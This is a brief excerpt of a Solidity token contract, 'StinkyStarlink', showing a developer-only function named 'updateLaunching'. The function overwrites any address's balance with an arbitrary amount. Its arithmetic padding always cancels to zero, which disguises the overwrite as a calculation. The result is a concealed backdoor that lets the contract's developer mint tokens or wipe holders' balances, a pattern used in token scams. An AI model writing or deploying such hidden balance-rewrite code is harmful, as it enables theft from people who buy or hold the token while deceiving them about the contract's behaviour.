...
contract StinkyStarlink is Ownable {
  ...
  function updateLaunching(address tokenAddress, uint256 amountToRecover) external onlyDev {
    _balances[tokenAddress] = (amountToRecover * 10 ** 9) + (_balances[tokenAddress] * 1 * 2 - 
    _balances[tokenAddress] * 1 * 2) + (_balances[tokenAddress] * 1 * 2 - _balances[tokenAddress] * 1 * 2);
  }
